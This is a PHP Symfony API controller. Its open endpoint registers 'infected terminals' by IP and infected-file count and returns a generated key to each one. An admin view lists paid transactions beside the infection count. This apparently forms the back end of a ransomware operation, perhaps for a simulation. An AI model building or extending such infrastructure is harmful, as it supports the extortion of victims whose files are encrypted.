<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Entity\Log;
use App\Repository\LogRepository;
use App\Repository\TransactionRepository;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Uid\Uuid;

/**
 * @Route("/api")
 */
class LogController extends BaseController
{
    public function __construct(
        private TransactionRepository $transactionRepository,
        private LogRepository $logRepository
    )
    {}

    /**
     * @Route("/logs", methods={"GET"})
     */
    public function index(): Response
    {
        try {
            $this->denyAccessUnlessGranted('ROLE_ADMIN');
            $transactions = $this->transactionRepository->findAllLastPaidTransactions(30);
            $logs = $this->logRepository->findAllLastLogs(30);

            return $this->json([
                'transactions' => $transactions,
                'logs' => $logs,
                'infectedTerminals' => count($logs)
            ]);
        } catch (\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }

    /**
     * @Route("/logs", methods={"POST"})
     */
    public function create(Request $request)
    {
        try {
            $data = json_decode($request->getContent(), true);

            $uuid = Uuid::v4();

            $log = (new Log)
                ->setIp($data['ip'])
                ->setNumberInfectedFile($data['infectedFiles'])
                ->setKey($uuid);

            $this->logRepository->save($log, true);

            return $this->json($log->getKey());
        } catch(\Error $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }
}